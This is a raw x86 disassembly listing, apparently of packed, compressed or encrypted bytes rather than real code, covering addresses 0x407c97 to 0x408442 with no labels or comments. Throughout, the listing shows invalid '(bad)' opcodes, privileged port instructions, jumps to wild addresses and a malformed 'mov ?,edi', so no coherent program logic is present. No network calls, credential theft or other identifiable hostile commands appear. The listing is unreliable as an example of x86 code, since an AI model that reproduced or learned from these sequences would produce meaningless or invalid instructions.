  407c97:	add    BYTE PTR [esi+0x1903c348],dl
  407c9d:	add    cl,al
  407c9f:	les    eax,FWORD PTR [esi-0x79acabb9]
  407ca5:	dec    eax
  407ca6:	push   ss
  407ca7:	push   edx
  407ca8:	cmp    al,0x5b
  407caa:	mov    eax,ds:0x55306ec4
  407caf:	mov    esp,DWORD PTR [esi+0x48]
  407cb2:	jo     0x407c3c
  407cb4:	dec    ecx
  407cb5:	inc    eax
  407cb6:	not    BYTE PTR [ecx-0x35]
  407cb9:	or     BYTE PTR [ecx-0x17361939],al
  407cbf:	push   eax
  407cc0:	jl     0x407cfb
  407cc2:	(bad)  
  407cc3:	push   ecx
  407cc4:	ds dec eax
  407cc6:	sbb    al,0x36
  407cc8:	jmp    0xbf9c6596
  407ccd:	add    dh,0x51
  407cd0:	mov    eax,0x1e59c98d
  407cd5:	dec    eax
  407cd6:	fs xchg ebp,edi
  407cd9:	aas    
  407cda:	scas   al,BYTE PTR es:[edi]
  407cdb:	push   ecx
  407cdc:	popa   
  407cdd:	mov    cl,0xe4
  407cdf:	stos   DWORD PTR es:[edi],eax
  407ce0:	jno    0x407ceb
  407ce2:	sahf   
  407ce3:	xchg   edi,eax
  407ce4:	add    DWORD PTR [eax-0x6a],eax
  407ce7:	push   ecx
  407ce8:	idiv   ch
  407cea:	mov    edx,0x910971bc
  407cef:	fstp   QWORD PTR [esi-0x610281b9]
  407cf5:	mov    esp,0x85adcfff
  407cfa:	aam    0x76
  407cfc:	add    BYTE PTR [eax+0x48],ah
  407cff:	add    al,0xdc
  407d01:	ret    0x3046
  407d04:	outs   dx,BYTE PTR ds:[esi]
  407d05:	mov    dh,0x64
  407d07:	not    DWORD PTR [esi+0x60]
  407d0a:	(bad)  
  407d0c:	adc    esi,eax
  407d0e:	inc    edi
  407d0f:	call   DWORD PTR [edx-0x57]
  407d12:	adc    al,al
  407d14:	mov    ch,0x28
  407d16:	(bad)  
  407d18:	add    eax,0x26ff47be
  407d1d:	mov    dh,0x64
  407d1f:	mul    DWORD PTR [esi]
  407d21:	loopne 0x407d40
  407d23:	add    cl,ch
  407d25:	xor    dl,BYTE PTR [esi+0x47d83985]
  407d2b:	(bad)  
  407d2c:	mov    ecx,0xa857d08a
  407d31:	xor    cl,BYTE PTR [eax-0x4b]
  407d34:	stc    
  407d35:	stc    
  407d36:	inc    edi
  407d37:	push   esi
  407d39:	aas    
  407d3a:	pop    ebx
  407d3b:	dec    eax
  407d3c:	test   al,0x32
  407d3e:	xor    DWORD PTR ds:0x8947e1a1,ebx
  407d44:	or     al,BYTE PTR fs:[eax-0x1]
  407d48:	(bad)  
  407d49:	lods   eax,DWORD PTR ds:[esi]
  407d4a:	test   esp,esp
  407d4c:	(bad)  
  407d4d:	add    DWORD PTR [esi+0x0],0xa2aef6
  407d54:	jmp    0xc5fe078b
  407d59:	jns    0x407da1
  407d5b:	(bad)  
  407d5c:	jmp    0xe9cf0a92
  407d61:	add    BYTE PTR [edx],dh
  407d63:	or     DWORD PTR [ebx-0xc1a5a4],eax
  407d69:	xchg   esi,eax
  407d6a:	xor    dl,BYTE PTR [esi]
  407d6c:	test   BYTE PTR [eax+0x32],ch
  407d6f:	or     DWORD PTR [eax],eax
  407d71:	add    BYTE PTR [eax+0x3d],al
  407d74:	(bad)  
  407d75:	out    dx,al
  407d76:	push   ds
  407d77:	fnstenv [eax+ecx*1-0x50]
  407d7b:	push   esi
  407d7c:	mov    al,0xff
  407d7e:	pop    edi
  407d7f:	fnstenv [esp+ebp*8-0x12699]
  407d86:	in     eax,0x42
  407d88:	out    0xd0,eax
  407d8a:	cdq    
  407d8b:	fsin   
  407d8d:	inc    ebp
  407d8f:	loop   0x407d87
  407d91:	(bad)  
  407d92:	out    dx,eax
  407d93:	fdiv   DWORD PTR [eax+ecx*1+0x0]
  407d97:	int3   
  407d98:	mov    al,0xff
  407d9a:	pop    edi
  407d9b:	fnstenv [esp+eiz*8-0x126b9]
  407da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da3:	inc    edx
  407da4:	out    0xb4,eax
  407da6:	(bad)  
  407da8:	(bad)  
  407da9:	call   ebp
  407dab:	cmc    
  407dac:	idiv   bh
  407dae:	aas    
  407daf:	fnstenv [eax+ecx*1+0x40]
  407db3:	dec    esi
  407db4:	mov    al,0xff
  407db6:	pop    edi
  407db7:	(bad)  
  407db8:	mov    ah,0xe0
  407dba:	push   edi
  407dbb:	(bad)  
  407dbc:	(bad)  
  407dbd:	inc    ebp
  407dbf:	inc    ecx
  407dc0:	out    0x98,eax
  407dc2:	test   eax,0x83fed6
  407dc7:	popf   
  407dc8:	cmc    
  407dc9:	idiv   bh
  407dcb:	pop    edi
  407dcc:	or     eax,0x989b1b74
  407dd1:	shl    bh,1
  407dd3:	out    dx,eax
  407dd4:	aad    0x3
  407dd6:	jne    0x407dd2
  407dd8:	ret    0xd884
  407ddb:	xlat   BYTE PTR ds:[ebx]
  407ddc:	aad    0xfe
  407dde:	dec    DWORD PTR [eax]
  407de0:	xlat   BYTE PTR ds:[ebx]
  407de1:	je     0x407deb
  407de3:	mov    al,ds:0x9fffb040
  407de8:	loope  0x407df3
  407dea:	push   0x31
  407dec:	xor    BYTE PTR [esi+0x75],cl
  407def:	cmp    DWORD PTR [eax-0x71194f04],ecx
  407df5:	dec    edi
  407df6:	mov    ch,0xd5
  407df8:	mov    esi,0xebc9ff4e
  407dfd:	xchg   edi,eax
  407dfe:	dec    esi
  407e00:	mov    dh,0x98
  407e02:	in     al,dx
  407e03:	mov    esi,0x70e84eae
  407e08:	pushf  
  407e09:	dec    edi
  407e0a:	push   DWORD PTR [esi-0x5108a35c]
  407e10:	(bad)  
  407e11:	pop    ebx
  407e12:	ss (bad) 
  407e15:	dec    esi
  407e16:	jmp    esp
  407e18:	iret   
  407e19:	push   esi
  407e1a:	call   DWORD PTR [esi-0x714be539]
  407e20:	test   BYTE PTR [esi-0x4b],0x69
  407e24:	es dec edi
  407e26:	dec    DWORD PTR [ecx+0xff974f]
  407e2c:	jbe    0x407e4c
  407e2e:	cdq    
  407e2f:	lock pushw ss
  407e32:	dec    edi
  407e33:	call   0xff8f8274
  407e38:	pop    esi
  407e39:	ins    BYTE PTR es:[edi],dx
  407e3a:	dec    ebx
  407e3b:	jmp    0xff8ebabc
  407e40:	dec    esi
  407e41:	mov    esp,0x9000e84e
  407e46:	add    eax,DWORD PTR [eax]
  407e48:	push   0xddfffb71
  407e4d:	stos   BYTE PTR es:[edi],al
  407e4e:	pop    esi
  407e4f:	xor    ebp,0x56
  407e52:	fcos   
  407e54:	cwde   
  407e55:	cmp    eax,0x5a29754e
  407e5a:	es mov cl,0x16
  407e5d:	jl     0x407edb
  407e5f:	inc    ebp
  407e60:	or     eax,0x7057f2cb
  407e65:	or     ecx,ebp
  407e67:	dec    esi
  407e68:	test   BYTE PTR [ecx],dl
  407e6a:	xchg   ecx,eax
  407e6b:	shl    ch,1
  407e6d:	inc    esp
  407e6e:	xchg   esi,eax
  407e6f:	dec    esi
  407e70:	fs inc ebp
  407e72:	mov    ds,eax
  407e74:	xor    DWORD PTR cs:[ebx],ebx
  407e77:	xchg   ebp,eax
  407e78:	fiadd  WORD PTR [eax+esi*4+0x41]
  407e7c:	sub    eax,0xdd7b1c09
  407e81:	mov    ah,BYTE PTR [ebp+0x6644be3f]
  407e87:	xor    BYTE PTR [ebp+eax*2-0x47],0x4e
  407e8c:	cmp    al,0x15
  407e8e:	push   esi
  407e8f:	sbb    BYTE PTR [eax],al
  407e91:	adc    ecx,0xffffffa7
  407e94:	add    ebx,DWORD PTR [ecx+0x3103662c]
  407e9a:	adc    BYTE PTR [ecx],ch
  407e9c:	(bad)  
  407e9d:	lods   eax,DWORD PTR ds:[esi]
  407e9e:	in     al,0xea
  407ea0:	add    esi,DWORD PTR [ecx]
  407ea2:	dec    esp
  407ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ea4:	dec    ebx
  407ea5:	xor    DWORD PTR [ecx],ecx
  407ea7:	jmp    0x150ef4af
  407eac:	dec    esi
  407ead:	cs or  ecx,ebp
  407eb0:	fldcw  WORD PTR [esi-0x4e]
  407eb3:	call   0xe8f2e591
  407eb8:	xor    ah,0x3c
  407ebb:	cdq    
  407ebc:	sub    BYTE PTR [ebp+edi*1-0x26b1b202],0xed
  407ec4:	xlat   BYTE PTR ds:[ebx]
  407ec5:	ds inc esp
  407ec7:	pop    esp
  407ec8:	push   eax
  407ec9:	dec    ecx
  407eca:	cmp    BYTE PTR [esi+0x4],0x31
  407ece:	adc    BYTE PTR [ecx+0xb3235d8],ch
  407ed4:	add    dh,BYTE PTR [ecx]
  407ed6:	or     DWORD PTR [ecx-0x62],edx
  407ed9:	imul   ecx,edx,0x159c4ce8
  407edf:	add    cl,al
  407ee1:	or     edi,DWORD PTR [ebx-0x1]
  407ee4:	scas   al,BYTE PTR es:[edi]
  407ee5:	mov    BYTE PTR [ecx-0x73],bl
  407ee8:	ins    BYTE PTR es:[edi],dx
  407ee9:	pop    ecx
  407eea:	cmp    al,0xff
  407eec:	sahf   
  407eed:	mov    ebp,0xc426e7d9
  407ef2:	inc    ebx
  407ef3:	jmp    DWORD PTR [eax+0x0]
  407ef6:	scas   al,BYTE PTR es:[edi]
  407ef7:	cmp    bh,dh
  407ef9:	xchg   BYTE PTR [esi+edx*4-0x7b],ch
  407efd:	lods   eax,DWORD PTR ds:[esi]
  407efe:	jl     0x407f44
  407f00:	call   FWORD PTR [ecx]
  407f02:	in     eax,dx
  407f03:	dec    esi
  407f04:	pop    eax
  407f05:	sub    BYTE PTR ds:0x6459b544,ch
  407f0b:	inc    esp
  407f0c:	call   FWORD PTR [esi+0x1e]
  407f0f:	push   edi
  407f10:	dec    eax
  407f11:	test   al,0x32
  407f13:	xor    DWORD PTR [ecx-0x69],edx
  407f16:	hlt    
  407f17:	inc    ebx
  407f18:	mov    DWORD PTR [ecx+ecx*1+0x3c],ebp
  407f1c:	(bad)  
  407f1d:	ds jnp 0x407f63
  407f20:	addr16 dec eax
  407f22:	(bad)  
  407f24:	jmp    FWORD PTR ds:0x26f7389e
  407f2a:	in     al,dx
  407f2b:	inc    ebx
  407f2c:	xor    eax,0xffc8b53b
  407f31:	add    BYTE PTR [eax+0x7b],al
  407f34:	dec    DWORD PTR [esi]
  407f36:	jmp    0x6a43:0xedfeec8d
  407f3d:	jmp    0xa898acbc
  407f42:	xor    al,BYTE PTR [ebp+esi*4-0x7]
  407f46:	fld    QWORD PTR [ebx-0x1]
  407f49:	out    0x27,al
  407f4b:	push   edi
  407f4c:	dec    eax
  407f4d:	sub    BYTE PTR ds:0x7d9f1531,ch
  407f53:	inc    edx
  407f54:	mov    DWORD PTR [edx+ecx*4+0x3a],esp
  407f58:	inc    DWORD PTR [eax]
  407f5a:	add    bh,dh
  407f5c:	pusha  
  407f5d:	jmp    DWORD PTR [edi-0x27]
  407f60:	outs   dx,BYTE PTR ds:[esi]
  407f61:	inc    eax
  407f62:	add    bh,al
  407f64:	fwait
  407f65:	lock not edi
  407f68:	aad    0xfe
  407f6a:	xor    eax,0x407eba
  407f6f:	mov    al,ds:0xc7ffb4dd
  407f74:	mov    edi,0xd5bfe084
  407f79:	dec    BYTE PTR [ebp-0x911b3]
  407f7f:	push   edi
  407f80:	jbe    0x407fe9
  407f82:	in     al,dx
  407f83:	and    BYTE PTR [esi-0x1],al
  407f86:	(bad)  
  407f87:	std    
  407f88:	aad    0xf6
  407f8a:	call   DWORD PTR [edi-0x2b]
  407f8d:	xor    al,0xd2
  407f8f:	add    BYTE PTR [edi-0x1],0xe7
  407f93:	ins    BYTE PTR es:[edi],dx
  407f94:	fwait
  407f95:	(bad)  
  407f96:	call   DWORD PTR [ebx+0xb1373c6]
  407f9c:	xchg   ebx,eax
  407f9d:	fdiv   st,st(7)
  407f9f:	push   edi
  407fa0:	aad    0x3
  407fa2:	jne    0x407f36
  407fa4:	aad    0x2f
  407fa6:	(bad)  
  407fa7:	or     eax,0x57fff6f2
  407fac:	loope  0x407fb7
  407fae:	(bad)  
  407faf:	or     eax,0x47fff6f2
  407fb4:	cmp    edi,edi
  407fb6:	call   FWORD PTR [eax+0x76]
  407fb9:	out    0x95,eax
  407fbb:	sbb    dl,ch
  407fbd:	dec    BYTE PTR [ebp-0x90a3300]
  407fc3:	inc    DWORD PTR [edi+0x77]
  407fc6:	addr16 aam 0xa0
  407fc9:	inc    edi
  407fca:	(bad)  
  407fcb:	(bad)  
  407fcc:	popf   
  407fcd:	(bad)  
  407fcf:	call   DWORD PTR [edi-0x32]
  407fd2:	xor    al,0xd2
  407fd4:	xor    eax,ebp
  407fd6:	(bad)  
  407fd7:	dec    DWORD PTR [esi]
  407fd9:	rcl    BYTE PTR [eax+0x43371eff],0x74
  407fe0:	inc    edx
  407fe1:	scas   eax,DWORD PTR es:[edi]
  407fe2:	mov    al,dl
  407fe4:	push   es
  407fe5:	jnp    0x408032
  407fe7:	add    al,0x7c
  407fe9:	es dec edx
  407feb:	xor    BYTE PTR [esi-0x908d04c],ch
  407ff1:	mov    ds:0xb4f60a5f,al
  407ff6:	das    
  407ff7:	mul    esi
  407ff9:	xchg   edx,eax
  407ffa:	add    al,0x0
  407ffc:	xor    DWORD PTR [eax],esi
  407ffe:	mov    bl,0xe7
  408000:	cmp    dh,0x4a
  408003:	push   DWORD PTR [edx-0x3908a004]
  408009:	mov    dl,0x3
  40800b:	je     0x40800b
  40800d:	scas   al,BYTE PTR es:[edi]
  40800e:	mov    ah,dl
  408010:	mov    esi,0x24024ae2
  408015:	and    bl,dh
  408017:	push   DWORD PTR [ebp-0x6108c854]
  40801d:	retf   0xfeb3
  408020:	fmul   st(3),st
  408022:	push   edx
  408023:	inc    DWORD PTR [eax]
  408025:	mov    es,edi
  408027:	fild   DWORD PTR [esi+0x5bffef2]
  40802e:	cmp    DWORD PTR [esi+0x4b1a65bd],eax
  408034:	push   DWORD PTR [ecx]
  408036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408037:	lock (bad) 
  408039:	pushf  
  40803a:	or     edx,DWORD PTR [ebx-0x1]
  40803d:	pop    esi
  40803e:	pop    ss
  40803f:	div    DWORD PTR [ecx-0x7abdbdaa]
  408045:	push   ebp
  408046:	inc    edx
  408047:	dec    edx
  408048:	push   DWORD PTR [ecx]
  40804a:	xor    BYTE PTR [ebx],al
  40804c:	add    BYTE PTR [edx+0x3e5fa408],dh
  408052:	inc    ecx
  408053:	fiadd  WORD PTR [ebx]
  408055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408056:	mov    ah,0x69
  408058:	mov    BYTE PTR ds:0x314ace39,dl
  40805e:	mov    ch,0x4a
  408060:	xchg   esp,edx
  408062:	xor    DWORD PTR [esi+0x3d0a0e4a],esi
  408068:	lods   eax,DWORD PTR ds:[esi]
  408069:	mov    cs,WORD PTR [ebx]
  40806b:	jmp    0x1c813fca
  408070:	cld    
  408071:	push   cs
  408072:	pushf  
  408073:	dec    edi
  408074:	dec    edx
  408075:	out    dx,al
  408076:	inc    eax
  408077:	pop    esp
  408078:	push   edi
  408079:	fiadd  WORD PTR [eax-0x72]
  40807c:	dec    edx
  40807d:	adc    DWORD PTR fs:[ecx+0x7e408761],edx
  408084:	dec    edx
  408085:	test   BYTE PTR [ecx],dh
  408087:	jle    0x4080d3
  408089:	add    dh,al
  40808b:	inc    eax
  40808c:	hlt    
  40808d:	sti    
  40808e:	(bad)  
  40808f:	popa   
  408090:	xchg   edi,eax
  408091:	dec    edx
  408092:	mov    dh,0x40
  408094:	xchg   esp,eax
  408095:	aaa    
  408096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408097:	inc    eax
  408098:	push   esi
  408099:	dec    edx
  40809a:	fsub   QWORD PTR ds:0x409e4a56
  4080a0:	mov    esp,0x8fa18efb
  4080a5:	dec    edx
  4080a6:	mov    es,WORD PTR [eax+0x7c]
  4080a9:	daa    
  4080aa:	jle    0x4080ec
  4080ac:	cs dec edx
  4080ae:	add    al,0x11
  4080b0:	adc    DWORD PTR [edi+0x4a1e40c4],ebp
  4080b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080b7:	sub    DWORD PTR [esi],ebx
  4080b9:	dec    edx
  4080ba:	inc    ax
  4080bc:	xchg   esp,eax
  4080bd:	sti    
  4080be:	push   esi
  4080bf:	jno    0x408118
  4080c1:	dec    edx
  4080c2:	push   esi
  4080c3:	inc    eax
  4080c4:	xor    al,0x5f
  4080c6:	inc    esi
  4080c7:	inc    eax
  4080c8:	add    dh,dh
  4080ca:	jmp    0x40805e
  4080cc:	mov    cl,0xee
  4080ce:	call   0xe1163612
  4080d3:	aas    
  4080d4:	call   ecx
  4080d6:	clc    
  4080d7:	js     0x4080d8
  4080d9:	(bad)  
  4080da:	js     0x408152
  4080dc:	call   0xe880e9b7
  4080e1:	cmp    eax,0xbeff3fc2
  4080e6:	mov    esi,0x78b6f728
  4080eb:	xor    DWORD PTR [ecx+0x78],ebp
  4080ee:	add    BYTE PTR [eax+0x40],ch
  4080f1:	call   FWORD PTR [ebp+ebx*2+0x38]
  4080f5:	call   FWORD PTR [esi-0x694f2073]
  4080fb:	js     0x40813d
  4080fd:	inc    ebp
  4080fe:	xchg   ecx,eax
  4080ff:	jp     0x40817a
  408101:	std    
  408102:	xchg   BYTE PTR [eax+0x40],ch
  408105:	jne    0x408184
  408107:	ins    DWORD PTR es:[edi],dx
  408108:	ret    
  408109:	pushf  
  40810a:	jmp    0xe202d341
  40810f:	xor    dl,dh
  408111:	mov    dl,BYTE PTR [ebp-0x54]
  408114:	inc    esp
  408115:	hlt    
  408116:	shl    DWORD PTR [edx],cl
  408118:	mov    bl,0xd
  40811a:	push   esi
  40811b:	jbe    0x408124
  40811d:	call   0xff8039fb
  408122:	jo     0x4080fa
  408124:	inc    ebx
  408125:	push   0xbe3032e9
  40812a:	sar    DWORD PTR [edi+0x5ae940d7],0xe1
  408131:	push   edi
  408132:	test   al,0x32
  408134:	inc    eax
  408135:	jne    0x408128
  408137:	or     ah,ah
  408139:	fst    DWORD PTR [esi]
  40813b:	clc    
  40813c:	lea    eax,[ebp+0x11]
  40813f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408141:	mov    ds:0xff4a9000,eax
  408146:	addr16 mov al,ds:0x4073
  40814a:	add    BYTE PTR [edi],bh
  40814c:	push   cs
  40814d:	ror    BYTE PTR [eax-0x77],cl
  408150:	or     ebp,eax
  408152:	sbb    eax,0xfed09400
  408157:	or     ebx,eax
  408159:	dec    esi
  40815a:	and    eax,0x67d95589
  40815f:	add    DWORD PTR [eax],ecx
  408161:	loop   0x408120
  408163:	call   DWORD PTR [ebp+0x3d]
  408166:	out    0xa2,eax
  408168:	mov    ebp,0x45fffed1
  40816d:	int    0xfe
  40816f:	jne    0x408135
  408171:	shl    DWORD PTR [eax+ecx*1-0x60],1
  408175:	cld    
  408176:	lods   al,BYTE PTR ds:[esi]
  408177:	dec    edi
  408179:	shl    DWORD PTR [esp+esi*8-0x50],1
  40817d:	in     eax,dx
  40817e:	scas   eax,DWORD PTR es:[edi]
  40817f:	jmp    FWORD PTR [edi+0x958ab62]
  408185:	add    eax,0xe2c075ff
  40818a:	std    
  40818b:	cld    
  40818c:	aas    
  40818d:	sar    esi,1
  40818f:	jne    0x4081dd
  408191:	shl    DWORD PTR [eax+ecx*1+0x60],1
  408195:	dec    ebx
  408196:	lods   eax,DWORD PTR ds:[esi]
  408197:	dec    DWORD PTR [edi]
  408199:	add    eax,edx
  40819b:	add    al,0x98
  40819d:	outs   dx,DWORD PTR ds:[esi]
  40819e:	mov    ch,ah
  4081a0:	or     edi,esi
  4081a2:	sti    
  4081a3:	push   0xffffff88
  4081a5:	pop    esp
  4081a6:	push   cs
  4081a7:	inc    ebp
  4081a9:	inc    edx
  4081aa:	out    0xe5,eax
  4081ac:	lods   eax,DWORD PTR ds:[esi]
  4081ad:	sar    esi,1
  4081af:	mov    ebp,edx
  4081b1:	(bad)  
  4081b2:	add    BYTE PTR [bx+si-0x421f],cl
  4081b7:	push   0x40724d00
  4081bc:	add    BYTE PTR [ecx],dh
  4081be:	mov    dl,bh
  4081c0:	pop    eax
  4081c1:	lock das 
  4081c3:	dec    eax
  4081c4:	jne    0x4081ef
  4081c6:	sbb    BYTE PTR [ebx],dh
  4081c8:	(bad)  [esi+0x3f]
  4081cb:	inc    edi
  4081cc:	jne    0x408213
  4081ce:	aaa    
  4081cf:	int    0x7
  4081d1:	dec    ecx
  4081d2:	es cdq 
  4081d4:	push   DWORD PTR [esi]
  4081d6:	jns    0x40821a
  4081d8:	add    al,0x31
  4081da:	cmc    
  4081db:	jp     0x4081c9
  4081dd:	mov    dl,0x6b
  4081df:	dec    eax
  4081e0:	push   0x31
  4081e2:	retf   0xfef3
  4081e5:	pushf  
  4081e6:	cmp    BYTE PTR [ebx-0x56],bl
  4081e9:	fdivr  QWORD PTR [esi+0x47]
  4081ec:	mov    DWORD PTR [esp+esi*2-0x24],ebp
  4081f0:	(bad)  
  4081f1:	(bad)  
  4081f2:	jle    0x40817a
  4081f4:	push   0xffc4c922
  4081f9:	push   esi
  4081fa:	or     BYTE PTR [ebp-0x2e68cec0],ch
  408200:	pop    es
  408201:	leave  
  408202:	mov    ah,0x2c
  408204:	call   esi
  408206:	sbb    DWORD PTR [eax+ebp*2],eax
  408209:	fs jmp 0x7b8f81d3
  40820f:	lods   al,BYTE PTR ds:[esi]
  408210:	inc    eax
  408211:	xor    DWORD PTR [edi+0x7169d210],ebp
  408217:	add    ebp,eax
  408219:	or     BYTE PTR [ebx+0x3a00ff47],ah
  40821f:	lock iret 
  408221:	and    ecx,DWORD PTR [ecx]
  408223:	and    DWORD PTR [ebp+0x5ba03140],ebp
  408229:	and    eax,0x5046fec5
  40822e:	sbb    DWORD PTR [eax],esi
  408230:	add    ebp,edi
  408232:	mov    edi,0xf058f247
  408237:	or     cl,ch
  408239:	mov    bl,0x6f
  40823b:	mov    bl,0xf0
  40823d:	pop    ebx
  40823e:	inc    ecx
  40823f:	pusha  
  408240:	push   ss
  408241:	inc    edi
  408242:	dec    ecx
  408243:	pop    ds
  408244:	pop    ecx
  408245:	inc    edi
  408246:	push   esi
  408247:	cmp    eax,0xb34e477c
  40824c:	lock pop ebx
  40824e:	mov    ch,0x6b
  408250:	test   BYTE PTR [esi+0x68],0x4a
  408254:	in     eax,0x3
  408256:	fcom   QWORD PTR [ecx+0x3df582d5]
  40825c:	aaa    
  40825d:	scas   eax,DWORD PTR es:[edi]
  40825e:	cwde   
  40825f:	or     DWORD PTR [ebx-0xb],eax
  408262:	pop    ds
  408263:	mov    bh,0xe0
  408265:	pop    ebx
  408266:	inc    edi
  408267:	outs   dx,BYTE PTR ds:[esi]
  408268:	mov    BYTE PTR [esi-0x48],0xc6
  40826c:	mov    esp,0x20d33c7a
  408271:	(bad)  
  408274:	in     al,dx
  408275:	test   eax,0x83e8ca6e
  40827a:	or     DWORD PTR cs:0x2faa4ebb,edx
  408281:	lds    eax,FWORD PTR [eax]
  408283:	(bad)  
  408285:	cmp    BYTE PTR [edx-0x516f646],0x8e
  40828c:	mov    ch,0xc3
  40828e:	lods   eax,DWORD PTR ds:[esi]
  40828f:	into   
  408290:	pushf  
  408291:	xor    BYTE PTR [esi-0x42],al
  408294:	mov    cl,0x2
  408296:	lods   eax,DWORD PTR ds:[esi]
  408297:	jno    0x4082a2
  408299:	mov    ecx,0x5e78e45b
  40829e:	inc    esi
  40829f:	add    DWORD PTR [ecx+0x7b8e03e8],esi
  4082a5:	mov    ecx,0x51111c46
  4082aa:	inc    ebx
  4082ab:	fs cmp al,0x3e
  4082ae:	pop    ebx
  4082af:	xlat   BYTE PTR ds:[ebx]
  4082b0:	ins    BYTE PTR es:[edi],dx
  4082b1:	add    BYTE PTR [esi],dh
  4082b3:	imul   DWORD PTR [edi]
  4082b5:	add    DWORD PTR [edi-0x6400044e],esp
  4082bb:	clc    
  4082bc:	ret    0xdafb
  4082bf:	repnz cmp edi,0xf23bf716
  4082c6:	aas    
  4082c7:	sub    al,BYTE PTR [esi*2-0x44a08c4]
  4082ce:	(bad)  
  4082cf:	jbe    0x4082d5
  4082d1:	call   0xff7d1cb9
  4082d6:	mov    cs,WORD PTR [ecx+edx*2-0x29cd123e]
  4082dd:	mov    cl,ch
  4082df:	mov    al,0x44
  4082e1:	cld    
  4082e2:	inc    ebx
  4082e3:	xor    eax,0xce11af
  4082e8:	out    0x3,al
  4082ea:	call   0xff7c2c84
  4082ef:	jo     0x4082b7
  4082f1:	aas    
  4082f2:	push   0xbe2c32e9
  4082f7:	inc    ecx
  4082f8:	out    dx,eax
  4082f9:	loopne 0x40833b
  4082fb:	jmp    0x2899380a
  408300:	sub    eax,0x7ae1753c
  408305:	xchg   esp,eax
  408306:	fmul   DWORD PTR [esi-0x7a8ac394]
  40830c:	je     0x4082c4
  40830e:	pop    es
  40830f:	xchg   ecx,eax
  408310:	(bad)  
  408311:	ins    BYTE PTR es:[edi],dx
  408312:	push   DWORD PTR [esi-0x6]
  408315:	inc    esi
  408316:	add    al,0xe9
  408318:	xchg   DWORD PTR [esi+0x5cf168ec],ecx
  40831e:	neg    DWORD PTR [esi-0x14]
  408321:	lea    eax,[ebp+0x55]
  408324:	in     eax,0x3a
  408326:	jne    0x408305
  408328:	in     eax,dx
  408329:	cmc    
  40832a:	rol    DWORD PTR [eax],1
  40832c:	rol    BYTE PTR [esi-0x1],0xe7
  408330:	jp     0x4082e2
  408332:	(bad)  
  408333:	call   DWORD PTR [ebx-0x567af139]
  408339:	pop    es
  40833a:	add    BYTE PTR [eax],al
  40833c:	pop    ds
  40833d:	jl     0x408336
  40833f:	add    BYTE PTR [eax+0x7],bl
  408342:	add    bh,al
  408344:	(bad)  
  408345:	retf   
  408346:	inc    BYTE PTR [edi]
  408348:	dec    eax
  408349:	pop    es
  40834a:	push   0x0
  40834c:	add    BYTE PTR [edx-0x5dff95f9],ah
  408352:	pop    es
  408353:	lea    eax,[ebp+0x3c]
  408356:	ja     0x4082e4
  408358:	test   DWORD PTR [esp+ecx*8],edi
  40835b:	(bad)  
  40835c:	jmp    FWORD PTR [eax-0x3c]
  40835f:	je     0x408359
  408361:	pop    es
  408362:	dec    esp
  408363:	sti    
  408364:	call   0x4033a5
  408369:	adc    eax,edi
  40836b:	jae    0x408372
  40836d:	loope  0x4083c9
  40836f:	add    BYTE PTR [eax],al
  408371:	sbb    BYTE PTR [edi-0x53],bl
  408374:	dec    eax
  408375:	dec    ecx
  408376:	add    eax,0xded475ff
  40837b:	test   BYTE PTR [edx-0x74b03a69],dh
  408381:	test   al,0xb3
  408383:	test   ah,dh
  408385:	mov    edi,0x1a50fec5
  40838a:	fnsave [edx+esi*4-0x49]
  40838e:	lds    ecx,FWORD PTR [eax-0x132b77b]
  408394:	push   DWORD PTR [eax+0x47ffae01]
  40839a:	pusha  
  40839b:	jmp    DWORD PTR [edi-0x4d]
  40839e:	outs   dx,DWORD PTR ds:[esi]
  40839f:	inc    eax
  4083a0:	add    BYTE PTR [edi],al
  4083a2:	mov    esi,eax
  4083a4:	div    DWORD PTR [ecx]
  4083a6:	rol    DWORD PTR [ebx-0x1],cl
  4083a9:	pop    esp
  4083aa:	(bad)  
  4083ab:	mov    edx,0x37d83140
  4083b0:	mov    cl,0x0
  4083b2:	xchg   bl,bh
  4083b4:	jns    0x40833b
  4083b6:	xchg   ebp,eax
  4083b7:	sti    
  4083b8:	inc    ebx
  4083b9:	dec    DWORD PTR [ebx]
  4083bb:	xor    bl,bl
  4083bd:	mov    cl,BYTE PTR [eax]
  4083bf:	jno    0x4083c4
  4083c1:	call   FWORD PTR [eax+eiz*1+0x135eff4c]
  4083c8:	push   cs
  4083c9:	shr    cl,cl
  4083cb:	jo     0x4083d0
  4083cd:	call   0xff84856e
  4083d2:	mov    eax,0x3ef756a5
  4083d7:	xor    ebx,eax
  4083d9:	dec    esi
  4083db:	(bad)  [ecx+0x79233140]
  4083e1:	lock push ds
  4083e3:	pop    ebx
  4083e4:	inc    ebx
  4083e5:	jmp    DWORD PTR [esi+edi*2-0x34]
  4083e9:	inc    eax
  4083ea:	xor    DWORD PTR [eax-0x6d],ecx
  4083ed:	mov    cl,0xe
  4083ef:	inc    ebx
  4083f0:	lea    eax,[ebp-0xbc8ce7]
  4083f6:	lods   al,BYTE PTR ds:[esi]
  4083f7:	lods   al,BYTE PTR ds:[esi]
  4083f8:	pop    edi
  4083f9:	div    esi
  4083fb:	push   0xffffffd4
  4083fd:	addr16 xchg ebp,eax
  4083ff:	enter  0xffc4,0xe7
  408403:	aam    0x33
  408405:	neg    esi
  408407:	xchg   edx,eax
  408408:	inc    ebx
  408409:	xor    eax,0xffc4e803
  40840e:	(bad)  
  40840f:	adc    esi,DWORD PTR [ebp-0x1]
  408412:	(bad)  
  408413:	ss inc ebx
  408415:	je     0x408417
  408417:	sbb    BYTE PTR [edi-0x55412380],ch
  40841d:	inc    edx
  40841e:	add    al,0x24
  408420:	or     ecx,edi
  408422:	inc    edx
  408423:	popa   
  408424:	mov    ah,BYTE PTR [esp-0x5a]
  408428:	cmp    DWORD PTR [esi-0x2c],edx
  40842b:	mov    ?,edi
  40842d:	jle    0x408472
  40842f:	mov    gs,WORD PTR ds:0xb4710edd
  408435:	out    0xd3,al
  408437:	xchg   esi,eax
  408438:	jmp    0x4083c0
  40843a:	inc    ebx
  40843b:	jbe    0x40847e
  40843d:	fs and al,0x66
  408440:	cmp    DWORD PTR [esi],esp
  408442:	sbb    DWORD PTR [ecx],esi
